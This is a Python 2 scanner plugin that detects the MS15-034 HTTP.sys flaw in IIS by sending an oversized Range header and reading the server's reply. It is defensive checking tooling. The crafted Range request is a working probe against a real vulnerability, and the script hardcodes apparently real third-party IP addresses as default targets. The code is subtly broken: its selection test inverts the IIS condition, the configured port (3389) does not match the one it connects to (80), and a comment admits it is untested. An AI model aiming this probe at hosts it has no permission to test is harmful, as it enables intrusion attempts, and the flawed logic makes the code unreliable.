#!/usr/bin/env python
#-*-coding:utf-8-*-

import sys
import re
import socket
import random

from dummy import *

info = {
	'NAME':'MS15-034 checker',
	'AUTHOR':'yangbh',
	'TIME':'20150415',
	'WEB':'http://www.secpulse.com/archives/6009.html',
	'DESCRIPTION':'MS15-034 checker'
}
opts = [
['ip','221.123.140.66','target ip'],
['ports',[3389],'target ip\'s ports']
]

def Assign(services):
	if services.has_key('url'):
		if services.has_key('HTTPServer') and services['HTTPServer'].lower().find('iis') == -1:
			return True
	return False

def Audit(services):
	url = services['url']
	m = re.match('(http[s]?)://([^:^/]+):?([^/]*)/',url)
	if m:
		ipAddr = m.group(2)
	else:
		logger('not a valid url %s' % url)
		return
	
	hexAllFfff = "18446744073709551615"
	req1 = "GET / HTTP/1.0\r\n\r\n"
	req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"
	logger("[*] Audit Started")

	client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	client_socket.connect((ipAddr, 80))
	client_socket.send(req1)

	try:
		boringResp = client_socket.recv(1024)
		if "Microsoft" not in boringResp:
				logger("[*] Not IIS")
				exit(0)
		client_socket.close()
		client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client_socket.connect((ipAddr, 80))
		client_socket.send(req)
		goodResp = client_socket.recv(1024)
		if "Requested Range Not Satisfiable" in goodResp:
			logger("[!!] Looks VULN")
			security_hole(ipAddr)
		elif " The request has an invalid header name" in goodResp:
			logger("[*] Looks Patched")
		else:
			logger("[*] Unexpected response, cannot discern patch status")

	except Exception,e:
		print e
# ----------------------------------------------------------------------------------------------------
# untest yet
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	url = 'http://223.255.137.71'
	if len(sys.argv) == 2:
		url = sys.argv[1]
	services = {'url':url,'HTTPServer':'iis7'}
	pprint(Audit(services))
	pprint(services)